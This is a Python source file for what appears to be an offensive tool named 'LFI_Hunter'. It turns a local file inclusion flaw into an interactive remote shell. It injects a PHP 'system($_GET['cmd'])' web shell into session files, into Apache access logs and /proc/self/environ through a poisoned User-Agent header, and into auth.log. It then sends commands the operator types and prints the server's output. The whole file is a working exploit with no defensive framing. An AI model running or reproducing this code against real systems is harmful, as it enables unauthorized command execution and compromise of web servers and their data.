#!/usr/bin/env python 

import time
import sys
import mechanize
import ssl
import urllib
import re
import os
import  base64
import difflib
import shutil
import ssl
W = '\033[0m'     
R = '\033[31m'    
O = '\33[37m'      
Y = '\033[1;33m' 



WebBanner =O +"""  
            ,   .     .    ,-.  .       . . 
            | . |     |   (   ` |       | | 
            | ) ) ,-. |-.  `-.  |-. ,-. | | 
            |/|/  |-' | | .   ) | | |-' | | 
            ' '   `-' `-'  `-'  ' ' `-' ' '
                    LFI_Hunter
                    @jacstory  
          """ +W
print(WebBanner)          
class RunShellCode:
    def __init__(self,**kwargs):
        with open("./Package/shell/.FileWebInfo.txt",'r') as DataWeb:
            DataWeb=   DataWeb.readlines()
            for line in DataWeb:
                if "-UV" in line or "--Vulnurl" in line:
                    self.Vulnurl = line.replace("-UV","").replace("--Vulnurl","").replace("\n",'').strip()
                if "-C" in line or "--Cookie"in line:
                    Cookie = line.replace("-C","").replace("--Cookie","").replace("\n",'').strip()
                    with open(Cookie,'r') as Cookie:
                        self.Cookie = Cookie.read()   
                if "self.url ="  in line:
                   self.url = line.replace("self.url =",'').replace("\n",'').strip()           
          #  if os.path.exists('./Package/shell/.FileWebInfo.txt'):
           #     os.remove('./Package/shell/.FileWebInfo.txt')  
            else:
                pass
        try :            
           self.WebControl()
           
        except Exception as go :
            print(go) 
            time.sleep(10) 

    def WebControl(self,**kwargs):
        if 'sess_' in self.url:
             while True:
                inputsuer = input(R+"Your_request :  "+W)
                request = mechanize.Browser()
                WebShell = "%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E"
                WEB = self.Vulnurl+WebShell
                request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                 ('Cookie',str(self.Cookie).replace('\n',''))]
                command = self.url+'&cmd='+inputsuer  
                with open("./Package/shell/.response.txt",'w') as response:
                    response = response.write(str(request.open(WEB).read()))
                with open("./Package/shell/.response2.txt",'w') as response2:
                    response2 = response2.write(str(request.open(command ).read()))     
                with open("./Package/shell/.response.txt",'r') as f:
                     file1_lines = f.read().split("\\n")
                with open("./Package/shell/.response2.txt",'r') as Rqreder:
                    file2_lines = Rqreder.read().split("\\n")  
                diff = difflib.unified_diff(file1_lines, file2_lines, fromfile='.response2.txt', tofile='.response1.txt', lineterm='')
                for line in diff:
                    if line.startswith('+') and not line.startswith('+++') and not line.startswith('++'):
                        cleaned_content = line[1:]
                        cleaned_content = re.sub(r'<[^>]+>', '', cleaned_content)
                        cleaned_content = re.sub(r'-- index.txt', '', cleaned_content, flags=re.MULTILINE)
                        cleaned_content = re.sub(r'\s+', ' ', cleaned_content).strip()
                        cleaned_content = re.sub(r'";preference\|s:\d+:"[^"]*";', '', cleaned_content)
                        cleaned_content = "".join(re.sub(r'selected_language\|s:\d+:"', '', cleaned_content)+"\n")
                        with open("./Package/shell/.data", 'a') as data:
                            data= data.write(str(cleaned_content))
  
                with open("./Package/shell/.data",'r')as data:
                    data = data.readlines()
                    try:
                       print(Y+"web_response  : "+W ,data[0].replace('\n',''))
                       for l in data[1:] :
                           print("\t\t"+l.replace('\n','')) 
                    except Exception as a :
                        print(Y+"web_response  : "+W , a)
                        continue                 
                if os.path.exists ("./Package/shell/.data")  :
                   os.remove("./Package/shell/.data")  
        elif "proc/self/environ" in self.url \
        or "/var/log/apache2/access.log"  in self.url or "access.log" in self.url:
            request = mechanize.Browser()
            paylaodPHP = "<?php system($_GET['cmd']); ?>"  
            request.addheaders = [('User-agent', 'Mozilla/5.0'+paylaodPHP+'(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                                   Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                  ('Cookie',str(self.Cookie).replace('\n',''))]
            with open("./Package/shell/.response.txt",'w') as response:
                response = response.write(str(request.open(self.url).read()))                      
            while True :
                inputsuer = input(R+"Your_request :  "+W)
                request = mechanize.Browser()
                request.set_handle_robots(False)
                command = self.url+'&cmd='+inputsuer 
                with open("./Package/shell/.response2.txt",'w') as response2:
                    response2 = response2.write(str(request.open(command ).read()))     
                with open("./Package/shell/.response.txt",'r') as f:
                     file1_lines = f.read().split("\\n")
                with open("./Package/shell/.response2.txt",'r') as Rqreder:
                    file2_lines = Rqreder.read().split("\\n")  
                DataList = []    
                diff = difflib.unified_diff(file1_lines, file2_lines, fromfile='.response2.txt', tofile='.response1.txt', lineterm='')
                for line in diff:
                    if line.startswith('+') and not line.startswith('+++') and not line.startswith('++'):
                        line= "".join(line.replace("Mozilla/5.0",'\n'))
                        cleaned_content = line[1:]   
                        cleaned_content = re.sub(r'\s+\n', '\n', cleaned_content)  # Remove extra blank lines
                        cleaned_content = re.sub(r'\+\s+', '', cleaned_content)  
                        cleaned_content = re.sub( r'^.*\b\w+\d+:.*', '', cleaned_content)
                        cleaned_text = re.sub(r'^\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b','' , cleaned_content)
                        cleaned_content = re.sub(r'";preference\|s:\d+:"[^"]*";', '', cleaned_content)
                        cleaned_content= re.sub(r'(X11.*?Firefox/.*?")', '',cleaned_content)
                        cleaned_content  = re.sub(r'\s+', ' ', cleaned_content)
                        
                        with open("./Package/shell/.data",'w') as data:
                            data = data.write(cleaned_content)
                        with open("./Package/shell/.data",'r') as data: 
                           data = data.read().split("\n")
                           for line in data:
                                if line in DataList:
                                  pass
                                else:
                                    DataList.append(line)
                try:
                    print(Y+"web_response  : "+W + DataList[0].replace('\n','').replace('(',''))
                    for l in DataList[1:] :
                          print("\t\t"+l.replace('\n','').replace('(',''))           
                    if os.path.exists ("./Package/shell/.data")  :
                       os.remove("./Package/shell/.data")
                    shutil.copyfile("./Package/shell/.response2.txt", "./Package/shell/.response.txt")
                except Exception as a :
                       print(Y+"web_response s: "+W , a)
                       continue
        elif 'auth' in self.url\
        or 'auth.log' in self.url:
            request = mechanize.Browser()
            request.set_handle_robots(False)
            request.set_handle_redirect(True)
            request.set_handle_refresh(True, max_time=1)
            request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(self.Cookie).replace('\n',''))]
            with open("./Package/shell/.response.txt",'w') as response:
                response = response.write(str(request.open(self.url).read()))  
            while True:
                inputsuer = input(R+"Your_request :  "+W)
                request = mechanize.Browser()
                request.set_handle_robots(False)
                request.set_handle_redirect(True)
                request.set_handle_refresh(True, max_time=1)
                request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(self.Cookie).replace('\n',''))]
                command = self.url+'&cmd='+inputsuer  
                with open("./Package/shell/.response2.txt",'w') as response2:
                    response2 = response2.write(str(request.open(command ).read()))     
                with open("./Package/shell/.response.txt",'r') as f:
                     file1_lines = f.read().split("\\n")
                with open("./Package/shell/.response2.txt",'r') as Rqreder:
                    file2_lines = Rqreder.read().split("\\n")  
                DataList = []
                diff = difflib.unified_diff(file1_lines, file2_lines, fromfile='.repones2.txt', tofile='.repones1.txt', lineterm='')
                for line in diff:
                    if line.startswith('+') and not line.startswith('+++') and not line.startswith('++'):  
                        cleaned_content= line[1:]
                       # cleaned_text = re.sub(r'\w.+\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b..+\s.+\d\D\d\S.+','' , cleaned_content)
                        cleaned_content = re.sub(r"^\w+.+\d:\d.+:\s+\w...........",'', cleaned_content)
                        cleaned_content = re.sub(r'\+\s+', '', cleaned_content)
                        with open("./Package/shell/.data",'w') as data:
                            data = data.write(cleaned_content)
                        with open("./Package/shell/.data",'r') as data: 
                            data = data.read().split("\n")
                        for line in data:
                            if 'ssh2' in line or 'invalid user' in line or 'from' in line\
                            or 'preauth' in line:
                                pass
                            elif line in DataList:
                                pass
                            else:
                                DataList.append(line)
                try:
                    print(Y+"web_response : "+W + DataList[0].replace('\n','').replace('(',''))
                    for l in DataList[1:] :
                       print("\t\t"+l.replace('\n','').replace('(',''))           
                    if os.path.exists ("./Package/shell/.data")  :
                       os.remove("./Package/shell/.data")
                    shutil.copyfile("./Package/shell/.response2.txt", "./Package/shell/.response.txt")
                except Exception as a :
                    print(Y+"web_response : "+W , a)
                    continue                          
if __name__=='__main__':
    try:
       RunShellCode()
    except Exception  as w :
       print(w)
       time.sleep(10)   

